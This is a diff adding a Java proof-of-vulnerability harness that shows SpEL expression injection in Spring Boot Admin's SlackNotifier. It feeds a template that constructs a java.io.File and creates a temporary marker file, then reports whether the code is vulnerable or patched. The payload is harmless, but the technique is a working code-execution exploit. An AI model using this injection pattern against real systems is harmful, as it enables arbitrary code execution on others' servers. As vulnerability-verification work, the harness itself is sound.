@@ -1,0 +1,104 @@
+diff --git a/.security-pipeline/pov/SpelInjectionPov.java b/.security-pipeline/pov/SpelInjectionPov.java
+new file mode 100644
+index 0000000..6744192
+--- /dev/null
++++ b/.security-pipeline/pov/SpelInjectionPov.java
+@@ -0,0 +1,98 @@
++/*
++ * Proof-of-Vulnerability for CWE-094 (SpEL code injection) in Spring Boot Admin
++ * notifier configuration templates.
++ *
++ * The notifiers (LetsChatNotifier, SlackNotifier, MicrosoftTeamsNotifier) take
++ * operator-supplied configuration strings (e.g. `notify.slack.message`,
++ * `notify.ms-teams.theme-color`, `notify.hipchat...`) and feed them straight
++ * into a SpelExpressionParser using a StandardEvaluationContext. A
++ * StandardEvaluationContext permits arbitrary type references, constructor
++ * invocation and method calls, so any actor able to influence that configuration
++ * value achieves arbitrary code execution when a notification fires.
++ *
++ * This POV drives the real, unmodified product code:
++ *   - SlackNotifier.setMessage(String)   -> parses the attacker template
++ *   - SlackNotifier.getText(event, inst) -> evaluates it (SpEL RCE sink)
++ *
++ * The attacker template constructs a java.io.File and calls createNewFile(),
++ * proving arbitrary object construction / method invocation (i.e. code
++ * execution). If the payload runs, a marker file appears on disk.
++ *
++ * Vulnerable (unpatched) code  -> marker created -> exit 0
++ * Patched code (restricted SpEL, e.g. SimpleEvaluationContext / no type refs)
++ *                              -> constructor/method call blocked or rejected,
++ *                                 marker NOT created -> exit 1
++ *
++ * The class lives in the notifier package so that the protected getText()
++ * sink can be exercised directly.
++ */
++package de.codecentric.boot.admin.server.notify;
++
++import java.io.File;
++
++import org.springframework.web.client.RestTemplate;
++
++import de.codecentric.boot.admin.server.domain.entities.Instance;
++import de.codecentric.boot.admin.server.domain.entities.InstanceRepository;
++import de.codecentric.boot.admin.server.domain.events.InstanceEvent;
++import de.codecentric.boot.admin.server.domain.events.InstanceStatusChangedEvent;
++import de.codecentric.boot.admin.server.domain.values.InstanceId;
++import de.codecentric.boot.admin.server.domain.values.Registration;
++import de.codecentric.boot.admin.server.domain.values.StatusInfo;
++
++public class SpelInjectionPov {
++
++	public static void main(String[] args) throws Exception {
++		// Unique marker that the injected SpEL payload will create if code
++		// injection succeeds.
++		File marker = new File(System.getProperty("java.io.tmpdir"), "sba_spel_pov_marker_" + System.nanoTime());
++		if (marker.exists()) {
++			marker.delete();
++		}
++
++		// Attacker-controlled notifier configuration value. In production this
++		// comes from application properties (notify.slack.message), an env var,
++		// or any externalized configuration source the attacker can influence.
++		// It uses SpEL's type-reference + constructor + method-call features,
++		// none of which should ever be reachable from a notification template.
++		String maliciousTemplate = "#{new java.io.File('" + marker.getAbsolutePath().replace("'", "''")
++				+ "').createNewFile()}";
++
++		// Build a real Instance / event, exactly like the product does at runtime.
++		Instance instance = Instance.create(InstanceId.of("-pov-id-"))
++				.register(Registration.create("PoVApp", "http://health").build());
++		InstanceEvent event = new InstanceStatusChangedEvent(instance.getId(), instance.getVersion(),
++				StatusInfo.ofDown());
++
++		// Exercise the genuine product class. repository is unused on this path.
++		SlackNotifier notifier = new SlackNotifier((InstanceRepository) null, new RestTemplate());
++		notifier.setMessage(maliciousTemplate);
++
++		String rendered = null;
++		try {
++			// getText() is the SpEL evaluation sink (SlackNotifier.java line ~133).
++			rendered = notifier.getText(event, instance);
++		}
++		catch (Throwable t) {
++			// A hardened/patched notifier rejects the dangerous expression here
++			// (e.g. SpelEvaluationException for type/constructor access). That is
++			// the SAFE outcome; the marker will not exist and we exit non-zero.
++			System.out.println("[pov] getText threw (payload rejected): " + t);
++		}
++
++		boolean executed = marker.exists();
++		System.out.println("[pov] payload template : " + maliciousTemplate);
++		System.out.println("[pov] rendered value   : " + rendered);
++		System.out.println("[pov] marker created   : " + executed + " (" + marker.getAbsolutePath() + ")");
++
++		if (executed) {
++			marker.delete();
++			System.out.println("[pov] VULNERABLE: attacker-controlled SpEL template executed arbitrary code.");
++			System.exit(0);
++		}
++
++		System.out.println("[pov] NOT VULNERABLE: SpEL code injection was blocked.");
++		System.exit(1);
++	}
++
++}
